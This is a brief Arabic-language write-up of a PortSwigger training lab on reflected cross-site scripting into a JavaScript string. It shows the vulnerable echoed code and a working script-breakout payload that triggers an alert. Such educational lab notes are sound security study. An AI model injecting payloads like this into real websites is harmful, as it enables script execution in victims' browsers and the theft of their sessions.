# lab : Reflected XSS into a JavaScript string with single quote and backslash escaped

https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped

- الفكره من الLab ده انك تعمل inject لثغره reflected XSS والكود مصاب عن طريق function مش معموله كويس

```bash
1. الكود المصاب :

2.                         var searchTerms = '\'\\\';alert(1);//\';';
                        document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
                    </script>
                    
                    
                    3. كود الي عمل alert 
                    
                    
                    4. </script><script>alert(1)</script>
```
